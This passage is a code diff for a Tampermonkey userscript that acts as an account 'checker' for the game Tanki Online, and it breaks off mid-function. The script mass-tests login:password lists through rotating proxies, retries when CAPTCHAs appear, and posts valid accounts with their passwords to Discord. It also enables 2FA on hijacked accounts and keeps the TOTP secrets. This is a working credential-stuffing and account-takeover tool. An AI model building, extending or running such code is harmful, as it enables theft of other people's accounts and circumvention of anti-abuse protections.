@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         Tanki Online — Checker prod. by yuuairline
 // @namespace    http://tampermonkey.net/
-// @version      1.0.2
+// @version      1.0.3
 // @description  Checker + auto 2FA enable
 // @author       yuuairline
 // @match        https://*.tankionline.com/play/
@@ -60,7 +60,11 @@
         PROXY_ROTATION_TEST_TIMEOUT: 10000,
         PROXY_ENABLED: true,
         AUTO_ENABLE_2FA: false,
-        TWOFA_ACCOUNTS_KEY: "tanki_2fa_accounts_v1"
+        RUBIES_STATUS_FILTER_MODE: "default", 
+        RUBIES_STATUS_FILTER: [], 
+
+        TWOFA_ACCOUNTS_KEY: "tanki_2fa_accounts_v1",
+        TWOFA_ARCHIVE_KEY: "tanki_2fa_accounts_archive_v1"
     };
 
     const MAX_EMPTY_LOGIN_RELOADS = 3;
@@ -268,8 +272,10 @@
                 email: acc.email || null,
                 year: acc.year || null,
                 rankFromBase: acc.rankFromBase || null,
-                bound: acc.bound !== undefined ? acc.bound : null
+                bound: acc.bound !== undefined ? acc.bound : null,
+                twofaSecret: acc.twofaSecret || null
             });
+            try { track2FAFromAccount(acc); } catch (_) {}
             added++;
         }
         if (added) saveFastValidAccounts();
@@ -383,6 +389,7 @@
         const safe = {
             login: payload.login,
             password: payload.password || null,
+            email: normalizeEmail(payload.email) || null,
             status: "valid",
             username: payload.username || null,
             rank: payload.rank || null,
@@ -399,11 +406,14 @@
             bonusReceived: !!payload.bonusReceived,
             newNickname: payload.newNickname || null,
             loginWasEmail: !!payload.loginWasEmail,
+            loginEmail: normalizeEmail(payload.loginEmail) || (payload.loginWasEmail ? normalizeEmail(payload.email) : null) || null,
             proxyIp: payload.proxyIp || null,
             twofaSecret: payload.twofaSecret || null,
             checkedAt: new Date().toISOString(),
             source: payload.source || "checker"
         };
+        if (!safe.email && idx >= 0 && list[idx].email) safe.email = list[idx].email;
+        if (!safe.loginEmail && idx >= 0 && list[idx].loginEmail) safe.loginEmail = list[idx].loginEmail;
 
         if (idx >= 0) list[idx] = { ...list[idx], ...safe };
         else list.push(safe);
@@ -436,28 +446,41 @@
         );
 
         const text = list.map(r => {
-            const acc = accountsByLogin.get(String(r.login || "").trim().toLowerCase());
-            const password = r.password || acc?.password || "—";
+            const key = String(r.login || "").trim().toLowerCase();
+            const acc = accountsByLogin.get(key) || {};
+            const st = getAccountStatus(r.login) || {};
+            const password = r.password || acc.password || "—";
+            const email =
+                normalizeEmail(r.email) ||
+                normalizeEmail(r.loginEmail) ||
+                normalizeEmail(acc.email) ||
+                normalizeEmail(st.loginEmail) ||
+                normalizeEmail(st.email) ||
+                (r.loginWasEmail && normalizeEmail(r.login)) ||
+                (st.loginWasEmail && normalizeEmail(st.loginEmail)) ||
+                null;
 
             const twofa = get2FAByLogin(r.login);
-            const secret = twofa?.secret || r.twofaSecret || null;
+            const secret = twofa?.secret || r.twofaSecret || st.twofaSecret || null;
             const lines = [
                 "--------------------------",
                 "Логин - " + r.login,
                 "Пароль - " + password,
-                "Ник - " + (r.username || "—"),
-                "Ранг - " + (r.rank || "—"),
-                "Опыт - " + (r.experience != null ? r.experience : "—"),
-                "Рубины - " + formatAmount(r.rubies),
-                "Кристаллы - " + formatAmount(r.crystals),
-                "Золотые ящики - " + (r.goldBoxes !== null && r.goldBoxes !== undefined && r.goldBoxes !== "" ? formatAmount(r.goldBoxes) : "—"),
-                "Танкоины - " + formatAmount(r.tankoins),
-                "Год - " + (r.year || "—"),
-                "Привязан - " + (r.bound === true ? "да" : r.bound === false ? "нет" : "—"),
-                "Смена ника - " + (r.nickChange || "—"),
-                "Компенсация - " + (r.bonusReceived ? "да" : "нет"),
-                "Новый ник - " + (r.newNickname || "—"),
-                "IP - " + (r.proxyIp || "—"),
+                "Ник - " + (r.username || st.username || "—"),
+                "Почта - " + (email || "—"),
+                "Вход через - " + (normalizeEmail(r.loginEmail) || normalizeEmail(st.loginEmail) || (r.loginWasEmail && email ? email : null) || "—"),
+                "Год - " + (r.year || acc.year || "—"),
+                "Ранг - " + (r.rank || st.rank || "—"),
+                "Рубины - " + formatAmount(r.rubies ?? st.rubies),
+                "Кристаллы - " + formatAmount(r.crystals ?? st.crystals),
+                "Танкоины - " + formatAmount(r.tankoins ?? st.tankoins),
+                "Золотые ящики - " + (r.goldBoxes !== null && r.goldBoxes !== undefined && r.goldBoxes !== "" ? formatAmount(r.goldBoxes) : (st.goldBoxes != null && st.goldBoxes !== "" ? formatAmount(st.goldBoxes) : "—")),
+                "Опыт - " + (r.experience != null ? r.experience : (st.experience != null ? st.experience : "—")),
+                "Привязан - " + (r.bound === true || acc.bound === true ? "да" : (r.bound === false || acc.bound === false ? "нет" : "—")),
+                "Компенсация - " + ((r.bonusReceived || st.bonusReceived) ? "да" : "нет"),
+                "Смена ника - " + (r.nickChange || st.nickChange || "—"),
+                "Новый ник - " + (r.newNickname || st.newNickname || "—"),
+                "IP - " + (r.proxyIp || st.proxyIp || "—"),
                 "Проверено - " + (r.checkedAt || "—")
             ];
             if (secret) lines.push("2FA secret - " + secret);
@@ -690,6 +713,12 @@
             const key = login.toLowerCase();
             if (seen.has(key)) return;
             seen.add(key);
+            const dashOrEmpty = (v) => {
+                if (v === null || v === undefined) return null;
+                const s = String(v).trim();
+                if (!s || s === "—" || s === "-" || /^null$/i.test(s) || /^undefined$/i.test(s)) return null;
+                return s;
+            };
             accounts.push({
                 login,
                 password,
@@ -697,12 +726,21 @@
                 year: extra.year || null,
                 rankFromBase: extra.rankFromBase || null,
                 bound: extra.bound !== undefined ? extra.bound : null,
-                twofaSecret: extra.twofaSecret || null,
-                nickname: extra.nickname || null,
+                twofaSecret: (() => {
+                    const s = dashOrEmpty(extra.twofaSecret);
+                    return s ? s.replace(/\s+/g, "").toUpperCase() : null;
+                })(),
+                nickname: dashOrEmpty(extra.nickname) || null,
                 experience: extra.experience ?? null,
-                rubies: extra.rubies || null,
-                crystals: extra.crystals || null,
-                tankoins: extra.tankoins || null
+                rubies: extra.rubies != null && extra.rubies !== "" ? extra.rubies : null,
+                crystals: extra.crystals != null && extra.crystals !== "" ? extra.crystals : null,
+                tankoins: extra.tankoins != null && extra.tankoins !== "" ? extra.tankoins : null,
+                goldBoxes: extra.goldBoxes != null && extra.goldBoxes !== "" ? extra.goldBoxes : null,
+                nickChange: dashOrEmpty(extra.nickChange) || null,
+                bonusReceived: extra.bonusReceived === true ? true : (extra.bonusReceived === false ? false : null),
+                newNickname: dashOrEmpty(extra.newNickname) || null,
+                proxyIp: dashOrEmpty(extra.proxyIp) || null,
+                checkedAt: dashOrEmpty(extra.checkedAt) || null
             });
         }
 
@@ -783,12 +821,19 @@
             let rubies = null;
             let crystals = null;
             let tankoins = null;
+            let goldBoxes = null;
+            let nickChange = null;
+            let bonusReceived = null;
+            let newNickname = null;
+            let proxyIp = null;
+            let checkedAt = null;
 
             const flush = () => {
                 if (login && password) {
                     addAccount(login, password, {
                         email, year, rankFromBase, bound, twofaSecret,
-                        nickname, experience, rubies, crystals, tankoins
+                        nickname, experience, rubies, crystals, tankoins,
+                        goldBoxes, nickChange, bonusReceived, newNickname, proxyIp, checkedAt
                     });
                 }
                 login = null;
@@ -803,27 +848,59 @@
                 rubies = null;
                 crystals = null;
                 tankoins = null;
+                goldBoxes = null;
+                nickChange = null;
+                bonusReceived = null;
+                newNickname = null;
+                proxyIp = null;
+                checkedAt = null;
             };
 
             const lines = block.split(/\n/).map(x => x.trim()).filter(Boolean);
             for (const line of lines) {
                 const nickOnly = line.match(/^(?:Ник|ник|Nickname)\s*[-:]\s*(.+?)\s*$/i);
                 if (nickOnly) {
-                    nickname = nickOnly[1].trim();
-                    if (!login) login = nickname;
+                    const nickVal = nickOnly[1].trim();
+                    if (nickVal && nickVal !== "—" && nickVal !== "-") {
+                        nickname = nickVal;
+                        if (!login) login = nickVal;
+                    }
+                    continue;
+                }
+
+                const loginOnly = line.match(/^(?:Логин|логин|Login|login)\s*[-:]\s*(.+?)\s*$/i);
+                if (loginOnly) {
+                    if (login && password) flush();
+                    let loginVal = loginOnly[1].trim();
+                    const legacy = loginVal.match(/^([^:\s]+)\s*:\s*(.+)$/);
+                    if (legacy && !password) {
+                        login = legacy[1].trim();
+                        password = legacy[2].trim();
+                    } else {
+                        login = loginVal;
+                    }
                     continue;
                 }
 
                 const nickMatch = line.match(NICK_RE);
                 if (nickMatch) {
-                    if (login && password) flush();
+                    const label = (line.match(/^(Ник|ник|Логин|логин|Login|login)/i) || [])[1] || "";
                     let nickVal = nickMatch[1].trim();
-                    const legacy = nickVal.match(/^([^:\s]+)\s*:\s*(.+)$/);
-                    if (legacy && !password) {
-                        login = legacy[1].trim();
-                        password = legacy[2].trim();
+                    const isLoginLabel = /^(?:Логин|логин|Login|login)$/i.test(label);
+                    if (isLoginLabel) {
+                        if (login && password) flush();
+                        const legacy = nickVal.match(/^([^:\s]+)\s*:\s*(.+)$/);
+                        if (legacy && !password) {
+                            login = legacy[1].trim();
+                            password = legacy[2].trim();
+                        } else {
+                            login = nickVal;
+                        }
                     } else {
-                        login = nickVal;
+                        if (nickVal && nickVal !== "—" && nickVal !== "-") {
+                            nickname = nickVal;
+                            if (!login) login = nickVal;
+                        }
                     }
                     continue;
                 }
@@ -885,6 +962,46 @@
                     continue;
                 }
 
+                const goldMatch = line.match(/^(?:Золотые\s*ящики|золотые\s*ящики)\s*[-:]\s*(.+)$/i);
+                if (goldMatch) {
+                    goldBoxes = parseNumberFromText(goldMatch[1]);
+                    continue;
+                }
+
+                const nickChangeMatch = line.match(/^(?:Смена\s*ника|смена\s*ника)\s*[-:]\s*(.+)$/i);
+                if (nickChangeMatch) {
+                    const v = nickChangeMatch[1].trim();
+                    nickChange = (!v || v === "—" || v === "-") ? null : v;
+                    continue;
+                }
+
+                const bonusMatch = line.match(/^(?:Компенсация|компенсация)\s*[-:]\s*(.+)$/i);
+                if (bonusMatch) {
+                    bonusReceived = isBonusConfirmed(bonusMatch[1]);
+                    continue;
+                }
+
+                const newNickMatch = line.match(/^(?:Новый\s*ник|новый\s*ник)\s*[-:]\s*(.+)$/i);
+                if (newNickMatch) {
+                    const v = newNickMatch[1].trim();
+                    newNickname = (!v || v === "—" || v === "-" || /^null$/i.test(v)) ? null : v;
+                    continue;
+                }
+
+                const ipMatch = line.match(/^(?:IP|ip)\s*[-:]\s*(.+)$/i);
+                if (ipMatch) {
+                    const v = ipMatch[1].trim();
+                    proxyIp = (!v || v === "—" || v === "-") ? null : v;
+                    continue;
+                }
+
+                const checkedMatch = line.match(/^(?:Проверено|проверено)\s*[-:]\s*(.+)$/i);
+                if (checkedMatch) {
+                    const v = checkedMatch[1].trim();
+                    checkedAt = (!v || v === "—" || v === "-") ? null : v;
+                    continue;
+                }
+
                 if (!LABEL_RE.test(line)) {
                     const m = line.match(/^([^\s:;]+)\s*[:;]\s*(.+)$/);
                     if (m && !m[1].toLowerCase().includes('http') && !/^https?:\/\//i.test(m[2])) {
@@ -931,6 +1048,14 @@
         const email = String(value).trim();
         if (!email || /^null$/i.test(email)) return null;
         return email;
+    }
+
+    function isBonusConfirmed(value) {
+        if (value === true || value === 1) return true;
+        if (value === false || value === 0 || value == null) return false;
+        const s = String(value).trim().toLowerCase().replace(/\s+/g, " ");
+        if (!s || s === "—" || s === "-" || s === "null" || s === "undefined" || s === "нет" || s === "no" || s === "0" || s === "false") return false;
+        return s === "да" || s === "yes" || s === "true" || s === "есть" || s === "1";
     }
     function formatAmount(value) {
         const n = String(value || "0").replace(/\s/g, "");
@@ -1994,20 +2119,125 @@
     }
 
     // =========================================================
-    // CAPTCHA COUNTER
+    // CAPTCHA COUNTER + PROXY FAIL TRACKING
     // =========================================================
     const CAPTCHA_COUNT_KEY = "tanki_captcha_count_v71";
     const CAPTCHA_LIMIT = 3;
+    const CAPTCHA_PROXY_FAILS_KEY = "tanki_captcha_proxy_fails_v1";
     let _captchaCountedThisPage = false;
 
     const getCaptchaCount = () => parseInt(GM_getValue(CAPTCHA_COUNT_KEY, 0)) || 0;
     const setCaptchaCount = (n) => GM_setValue(CAPTCHA_COUNT_KEY, Math.max(0, n | 0));
+
+    function loadCaptchaProxyFailState() {
+        try {
+            const raw = GM_getValue(CAPTCHA_PROXY_FAILS_KEY, null);
+            const st = raw ? (typeof raw === "string" ? JSON.parse(raw) : raw) : null;
+            return {
+                failedProxyIds: Array.isArray(st?.failedProxyIds) ? st.failedProxyIds : [],
+                consecutiveSwitches: Number(st?.consecutiveSwitches) || 0,
+                lastFailAt: st?.lastFailAt || null
+            };
+        } catch (_) {
+            return { failedProxyIds: [], consecutiveSwitches: 0, lastFailAt: null };
+        }
+    }
+
+    function saveCaptchaProxyFailState(st) {
+        GM_setValue(CAPTCHA_PROXY_FAILS_KEY, JSON.stringify({
+            failedProxyIds: st.failedProxyIds || [],
+            consecutiveSwitches: st.consecutiveSwitches || 0,
+            lastFailAt: st.lastFailAt || null
+        }));
+    }
+
+    function clearCaptchaProxyFailState(reason) {
+        const prev = loadCaptchaProxyFailState();
+        if (prev.consecutiveSwitches || prev.failedProxyIds.length) {
+            console.log(`[captcha] Сброс proxy-fail state${reason ? ": " + reason : ""}`);
+        }
+        try { GM_deleteValue(CAPTCHA_PROXY_FAILS_KEY); } catch (_) {}
+    }
+
+    function markProxyHealthy(reason) {
+        clearCaptchaProxyFailState(reason || "healthy");
+    }
+
+    function getCurrentProxyIdForCaptcha() {
+        try {
+            const p = proxyRotationManager?.currentProxy;
+            if (!p) return null;
+            return p.id || `${p.scheme || "http"}://${p.host}:${p.port}`;
+        } catch (_) {
+            return null;
+        }
+    }
+    
+    function registerCaptchaProxyFailure() {
+        const st = loadCaptchaProxyFailState();
+        const proxyId = getCurrentProxyIdForCaptcha();
+        if (proxyId && !st.failedProxyIds.includes(proxyId)) {
+            st.failedProxyIds.push(proxyId);
+        }
+        st.consecutiveSwitches = (st.consecutiveSwitches || 0) + 1;
+        st.lastFailAt = new Date().toISOString();
+        saveCaptchaProxyFailState(st);
+
+        const proxyCount = proxyRotationManager?.proxyList?.length || 0;
+        const uniqueFails = st.failedProxyIds.length;
+
+        console.warn(
+            `[captcha] Proxy fail: id=${proxyId || "—"} | fails=${uniqueFails}/${proxyCount || "?"} | streak=${st.consecutiveSwitches}`
+        );
+
+        if (!CONFIG.PROXY_ENABLED) {
+            return { stop: true, reason: "proxy_disabled_captcha" };
+        }
+        if (!proxyCount) {
+            return { stop: true, reason: "no_proxies" };
+        }
+        if (uniqueFails >= proxyCount) {
+            return { stop: true, reason: "all_proxies_captcha", uniqueFails, proxyCount, streak: st.consecutiveSwitches };
+        }
+        if (st.consecutiveSwitches >= proxyCount) {
+            return { stop: true, reason: "full_proxy_cycle_captcha", uniqueFails, proxyCount, streak: st.consecutiveSwitches };
+        }
+        return { stop: false, uniqueFails, proxyCount, streak: st.consecutiveSwitches };
+    }
+
+    async function stopCheckerDueToDeadProxies(detail) {
+        console.error("[captcha] STOP: all proxies dead (CAPTCHA)", detail);
+        resetCaptchaCount("stop: all proxies dead");
+        try { setRunningState(false); } catch (_) {}
+        isRunning = false;
+        isPaused = false;
+        try { updateUI(); } catch (_) {}
+        const reason = (detail && detail.reason) || "exhausted";
+        const fails = (detail && detail.uniqueFails) != null ? detail.uniqueFails : "?";
+        const total = (detail && detail.proxyCount) != null ? detail.proxyCount : "?";
+        const streak = (detail && detail.streak) != null ? detail.streak : "?";
+        const msg = [
+            "STOP: proverka ostanovlena — vse proksi lovyat CAPTCHA.",
+            "Reason: " + reason,
+            "Dead proxies: " + fails + "/" + total,
+            "Switch streak: " + streak,
+            "Dobav svezhie proksi ili reshi CAPTCHA, zatem Start."
+        ].join("\n");
+        showToast("Все прокси мёртвы (CAPTCHA) — проверка остановлена", "error");
+        try {
+            await sendDiscordMessage(msg);
+        } catch (_) {}
+        appendOpsLog("captcha_all_proxies_stop:" + reason);
+    }
 
     function resetCaptchaCount(reason) {
         const prev = getCaptchaCount();
         if (prev > 0) console.log(`[captcha] Счётчик сброшен (${prev} → 0)${reason ? ": " + reason : ""}`);
         setCaptchaCount(0);
         _captchaCountedThisPage = false;
+        if (reason && /успешн|lobby|solved|valid|healthy/i.test(String(reason))) {
+            markProxyHealthy(reason);
+        }
     }
     function incrementCaptchaCount() { const c = getCaptchaCount() + 1; setCaptchaCount(c); return c; }
     const isCaptchaLimitReached = (c) => c >= CAPTCHA_LIMIT;
@@ -2055,39 +2285,73 @@
     );
 
     // =====================================================
-    // 3/3 — меняем proxy и продолжаем работу
+    // 3/3 — меняем proxy; если все прокси мёртвые — СТОП
     // =====================================================
     if (isCaptchaLimitReached(cnt)) {
-        console.warn(`[${timestamp}] 🤖 CAPTCHA 3/3 — переключаем proxy и продолжаем работу`);
+        console.warn(`[${timestamp}] 🤖 CAPTCHA 3/3 для ${login}`);
 
         if (MODE === "fastValid") advanceFastValidQueue();
         else advanceCheckQueue();
+
+        const failInfo = registerCaptchaProxyFailure();
+        if (failInfo.stop) {
+            setCaptchaCount(0);
+            _captchaCountedThisPage = false;
+            await stopCheckerDueToDeadProxies(failInfo);
+            return { login, status: "captcha_all_proxies_dead" };
+        }
 
         let switched = false;
         if (CONFIG.PROXY_ENABLED && proxyRotationManager) {
             switched = await proxyRotationManager.switchNextProxy("CAPTCHA_3_CONSECUTIVE");
         } else if (!CONFIG.PROXY_ENABLED) {
-            switched = true;
-            console.warn(`[${timestamp}] CAPTCHA 3/3 — PROXY_ENABLED=false, переключение прокси пропущено`);
+            switched = false;
+            console.warn(`[${timestamp}] CAPTCHA 3/3 — PROXY_ENABLED=false`);
         }
 
-        resetCaptchaCount("3 CAPTCHA подряд — proxy переключён");
+        setCaptchaCount(0);
+        _captchaCountedThisPage = false;
 
         if (!switched) {
             console.error("[PROXY] Не удалось переключить proxy после 3 CAPTCHA подряд");
-            showToast("3 CAPTCHA подряд — proxy не удалось сменить", "error");
+            await stopCheckerDueToDeadProxies({
+                reason: "switch_failed",
+                uniqueFails: failInfo.uniqueFails,
+                proxyCount: failInfo.proxyCount,
+                streak: failInfo.streak
+            });
             return { login, status: "captcha_proxy_switch_failed" };
         }
 
-        if (CONFIG.PROXY_ENABLED) {
-            showToast("3 CAPTCHA подряд — переключён proxy, продолжаем", "warning");
-            sendDiscordMessage("🔄 CAPTCHA появилась 3 раза подряд — proxy автоматически переключён, проверка продолжается.");
-        } else {
-            showToast("3 CAPTCHA подряд — прокси выключены, продолжаем", "warning");
+        const after = loadCaptchaProxyFailState();
+        const proxyCount = proxyRotationManager?.proxyList?.length || 0;
+        if (proxyCount && after.consecutiveSwitches >= proxyCount) {
+            await stopCheckerDueToDeadProxies({
+                reason: "full_proxy_cycle_after_switch",
+                uniqueFails: after.failedProxyIds.length,
+                proxyCount,
+                streak: after.consecutiveSwitches
+            });
+            return { login, status: "captcha_all_proxies_dead" };
         }
 
+        showToast(
+            `CAPTCHA 3/3 — proxy ${after.consecutiveSwitches}/${proxyCount || "?"}, продолжаем`,
+            "warning"
+        );
+        try {
+            const lastDc = Number(GM_getValue("tanki_captcha_discord_ts", 0)) || 0;
+            if (Date.now() - lastDc > 60000) {
+                GM_setValue("tanki_captcha_discord_ts", Date.now());
+                sendDiscordMessage(
+                    `🔄 CAPTCHA 3/3 — proxy переключён (${after.consecutiveSwitches}/${proxyCount}). ` +
+                    `Мёртвых: ${after.failedProxyIds.length}. При полном круге проверка остановится.`
+                );
+            }
+        } catch (_) {}
+
         const nextAcc = shuffledAccounts[currentIndex];
-        console.log(`[captcha] 3/3: ${login} пропущен → следующий аккаунт: ${nextAcc?.login || "нет"}`);
+        console.log(`[captcha] 3/3: ${login} пропущен → следующий: ${nextAcc?.login || "нет"} | proxy streak ${after.consecutiveSwitches}/${proxyCount}`);
 
         await sleep(150);
         location.reload();
@@ -2168,7 +2432,6 @@
         return true;
     }
 
-    /** Ждёт кнопку выхода и сразу жмёт. timeoutMs — сколько ждать появления. */
     async function waitAndClickExitToLobby(timeoutMs = 15000) {
         const start = Date.now();
         while (Date.now() - start < timeoutMs) {
@@ -2476,8 +2739,41 @@
     }
     function getPreferredLogin(acc) {
         if (!acc) return null;
-        const email = normalizeEmail(acc.email);
-        return email || String(acc.login || "").trim();
+        const st = getAccountStatus(acc.login) || {};
+        const newNick = String(st.newNickname || acc.newNickname || "").trim();
+        if (newNick && newNick !== "—" && newNick !== "-") return newNick;
+        const email = normalizeEmail(acc.email) || normalizeEmail(st.loginEmail) || normalizeEmail(st.email);
+        if (email) return email;
+        const nick = String(st.username || acc.nickname || acc.fullName || "").trim();
+        if (nick && nick !== "—" && nick.toLowerCase() !== String(acc.login || "").toLowerCase()) return nick;
+        return String(acc.login || "").trim();
+    }
+
+    function getRubiesAuthIdentifier(acc, st) {
+        acc = acc || {};
+        st = st || getAccountStatus(acc.login) || {};
+        const loginKey = String(acc.login || "").trim();
+        const candidates = [];
+
+        const push = (val, kind) => {
+            const v = String(val || "").trim();
+            if (!v || v === "—" || v === "-" || /^null$/i.test(v)) return;
+            if (candidates.some(c => c.id.toLowerCase() === v.toLowerCase())) return;
+            candidates.push({ id: v, kind });
+        };
+
+        push(st.newNickname || acc.newNickname, "newNickname");
+        push(normalizeEmail(acc.email) || normalizeEmail(st.loginEmail) || normalizeEmail(st.email), "email");
+        const uname = String(st.username || "").trim();
+        if (uname && uname.toLowerCase() !== loginKey.toLowerCase()) push(uname, "username");
+        const nick = String(acc.nickname || acc.fullName || "").trim();
+        if (nick && nick.toLowerCase() !== loginKey.toLowerCase()) push(nick, "nickname");
+        push(loginKey, "login");
+
+        return {
+            primary: candidates[0] || { id: loginKey, kind: "login" },
+            candidates
+        };
     }
 
     async function enterCredentialsAndPlay(login, password) {
@@ -2787,11 +3083,6 @@ function sendDiscordText(text) {
     return queueDiscordNotification(text, null);
 }
 
-
-/**
- * Валидный аккаунт — пароль и компенсация всегда.
- * Отправка через await sendDiscordMessage (не очередь).
- */
 async function notifyValidAccount(data) {
 
     if (!data || !isDiscordConfigured()) {
@@ -3130,8 +3421,6 @@ async function testDiscordNotification() {
     // CHECKER FLOW
     // =========================================================
     function readGoldBoxesFromDom() {
-        // Только стабильные признаки: cellAdd + img GoldBox*.svg; число в span того же контейнера.
-        // Не используем динамические классы вида ksc-203.
         const cells = document.querySelectorAll(".SuppliesComponentStyle-cellAdd, [class*='SuppliesComponentStyle-cellAdd']");
         for (const cell of cells) {
             if (!cell || !cell.isConnected) continue;
@@ -3139,14 +3428,12 @@ async function testDiscordNotification() {
             if (!img) continue;
             const src = String(img.getAttribute("src") || "");
             if (!/GoldBox/i.test(src) || !/\.svg(\?|$)/i.test(src)) continue;
-            // span — прямой/ближайший потомок cellAdd (рядом с .SuppliesComponentStyle-cell)
             let span = null;
             for (const child of cell.children) {
                 if (child.tagName === "SPAN") { span = child; break; }
             }
             if (!span) span = cell.querySelector(":scope > span");
             if (!span) {
-                // fallback: span рядом с img-контейнером, но всё ещё внутри cellAdd
                 span = cell.querySelector("span");
             }
             if (!span) continue;
@@ -3166,7 +3453,6 @@ async function testDiscordNotification() {
             value = readGoldBoxesFromDom();
             if (value !== null) return value;
         }
-        // Элемент не появился — неизвестно, НЕ подменяем на "0"
         return null;
     }
     async function getTankoins() {
@@ -3282,33 +3568,155 @@ async function testDiscordNotification() {
     function save2FAAccounts(list) {
         GM_setValue(CONFIG.TWOFA_ACCOUNTS_KEY, JSON.stringify(Array.isArray(list) ? list : []));
     }
+    function load2FAArchive() {
+        try {
+            const raw = GM_getValue(CONFIG.TWOFA_ARCHIVE_KEY, null);
+            const arr = raw ? JSON.parse(raw) : [];
+            return Array.isArray(arr) ? arr : [];
+        } catch (e) { return []; }
+    }
+    function save2FAArchive(list) {
+        GM_setValue(CONFIG.TWOFA_ARCHIVE_KEY, JSON.stringify(Array.isArray(list) ? list : []));
+    }
+
+    function normalize2FASecret(secret) {
+        if (secret == null) return null;
+        let s = String(secret).replace(/\s+/g, "").toUpperCase();
+        const m = s.match(/[?&]SECRET=([A-Z2-7]+)/i);
+        if (m) s = m[1].toUpperCase();
+        s = s.replace(/[^A-Z2-7]/g, "");
+        if (!s || s.length < 16) return null;
+        if (!/^[A-Z2-7]+$/.test(s)) return null;
+        return s;
+    }
+
+    function isValid2FASecretFormat(secret) {
+        return !!normalize2FASecret(secret);
+    }
+
+    async function verify2FASecretWorks(secret) {
+        const s = normalize2FASecret(secret);
+        if (!s) return { ok: false, error: "invalid_format" };
+        try {
+            const code = await generateTOTP(s);
+            if (!code || !/^\d{6}$/.test(String(code))) return { ok: false, error: "bad_code" };
+            return { ok: true, code: String(code) };
+        } catch (e) {
+            return { ok: false, error: e?.message || "totp_error" };
+        }
+    }
+
+    function archive2FAAccount(row, reason) {
+        if (!row || !row.login) return;
+        const archive = load2FAArchive();
+        archive.push({
+            ...row,
+            archivedAt: new Date().toISOString(),
+            archiveReason: reason || "duplicate"
+        });
+        while (archive.length > 500) archive.shift();
+        save2FAArchive(archive);
+    }
+
+    function dedupe2FAAccounts() {
+        const list = load2FAAccounts();
+        const byLogin = new Map();
+        let mergedLogin = 0;
+        for (const r of list) {
+            if (!r || !r.login) continue;
+            const key = String(r.login).trim().toLowerCase();
+            const secret = normalize2FASecret(r.secret);
+            if (!secret) continue;
+            r.secret = secret;
+            if (!byLogin.has(key)) {
+                byLogin.set(key, r);
+            } else {
+                const prev = byLogin.get(key);
+                byLogin.set(key, {
+                    ...prev,
+                    ...r,
+                    login: prev.login || r.login,
+                    password: r.password || prev.password,
+                    email: r.email || prev.email,
+                    nickname: r.nickname || prev.nickname,
+                    secret: secret || prev.secret,
+                    password: r.password || prev.password
+                });
+                mergedLogin++;
+            }
+        }
+        const unique = [...byLogin.values()];
+        const seenSecrets = new Map(); 
+        const kept = [];
+        let archivedDupSecret = 0;
+        for (const r of unique) {
+            const sec = normalize2FASecret(r.secret);
+            if (!sec) continue;
+            if (seenSecrets.has(sec)) {
+                archive2FAAccount(r, "duplicate_secret:" + seenSecrets.get(sec));
+                archivedDupSecret++;
+                continue;
+            }
+            seenSecrets.set(sec, r.login);
+            kept.push(r);
+        }
+        save2FAAccounts(kept);
+        return { total: kept.length, mergedLogin, archivedDupSecret };
+    }
+
     function upsert2FAAccount(payload) {
-        if (!payload || !payload.login || !payload.secret) return false;
+        if (!payload || !payload.login) return false;
+        const secret = normalize2FASecret(payload.secret);
+        if (!secret) return false;
         const key = String(payload.login).trim().toLowerCase();
         if (!key) return false;
+
         const list = load2FAAccounts();
+        for (let i = list.length - 1; i >= 0; i--) {
+            const r = list[i];
+            if (!r) continue;
+            const rs = normalize2FASecret(r.secret);
+            if (rs === secret && String(r.login || "").toLowerCase() !== key) {
+                archive2FAAccount(r, "duplicate_secret_on_upsert:" + payload.login);
+                list.splice(i, 1);
+            }
+        }
+
         const idx = list.findIndex(r => String(r.login || "").toLowerCase() === key);
         const safe = {
-            login: payload.login,
+            login: String(payload.login).trim(),
             password: payload.password || null,
-            email: payload.email || null,
+            email: normalizeEmail(payload.email) || null,
             nickname: payload.nickname || null,
-            secret: String(payload.secret).replace(/\s+/g, "").toUpperCase(),
+            secret,
             activatedAt: payload.activatedAt || new Date().toISOString(),
             rank: payload.rank || null,
             experience: payload.experience ?? null,
-            rubies: payload.rubies || "0",
-            crystals: payload.crystals || "0",
-            tankoins: payload.tankoins || "0",
+            rubies: payload.rubies != null ? payload.rubies : null,
+            crystals: payload.crystals != null ? payload.crystals : null,
+            tankoins: payload.tankoins != null ? payload.tankoins : null,
             bound: payload.bound ?? null,
-            year: payload.year ?? null
+            year: payload.year ?? null,
+            secretVerified: payload.secretVerified === true,
+            secretVerifiedAt: payload.secretVerifiedAt || null,
+            lastCodeCheck: payload.lastCodeCheck || null
         };
-        if (idx >= 0) list[idx] = { ...list[idx], ...safe };
-        else list.push(safe);
+        if (idx >= 0) {
+            list[idx] = {
+                ...list[idx],
+                ...safe,
+                password: safe.password || list[idx].password,
+                email: safe.email || list[idx].email,
+                nickname: safe.nickname || list[idx].nickname
+            };
+        } else {
+            list.push(safe);
+        }
         save2FAAccounts(list);
         appendOpsLog("2fa_saved:" + payload.login);
         return true;
     }
+
     function remove2FAAccount(login) {
         const key = String(login || "").trim().toLowerCase();
         const list = load2FAAccounts().filter(r => String(r.login || "").toLowerCase() !== key);
@@ -3317,72 +3725,147 @@ async function testDiscordNotification() {
     function clear2FAAccounts() {
         save2FAAccounts([]);
     }
-    function import2FAAccountsFromText(text) {
-        const raw = String(text || "").replace(/\r/g, "");
-        let added = 0, skipped = 0;
-        const seen = new Set();
 
-        function pushRow(login, password, secret, extra = {}) {
-            login = String(login || "").trim();
-            password = String(password || "").trim();
-            secret = String(secret || "").replace(/\s+/g, "").toUpperCase();
-            if (!login || !secret || secret.length < 16) { skipped++; return; }
-            if (!/^[A-Z2-7]+$/.test(secret)) { skipped++; return; }
-            const key = login.toLowerCase();
-            if (seen.has(key)) return;
-            seen.add(key);
-            upsert2FAAccount({
-                login,
-                password: password || null,
-                email: extra.email || (login.includes("@") ? login : null),
-                nickname: extra.nickname || null,
-                secret,
-                rank: extra.rank || null,
-                year: extra.year || null,
-                bound: extra.bound ?? null,
-                activatedAt: new Date().toISOString()
-            });
-            if (password) {
-                const exists = RUBIES_ACCOUNTS.some(a => String(a.login || "").toLowerCase() === key);
-                if (!exists) {
-                    try {
-                        addRubiesAccountsFromText(login + ";" + password);
-                    } catch (_) {
-                        RUBIES_ACCOUNTS.push({ login, password, email: extra.email || null });
-                        try { saveRubiesAccounts(); } catch (__) {}
-                    }
-                }
+    async function import2FAAccountsFromText(text) {
+        const raw = String(text || "").replace(/\r/g, "");
+        let added = 0, updated = 0, skipped = 0, invalidSecret = 0, verified = 0, verifyFail = 0;
+
+        const rows = [];
+        try {
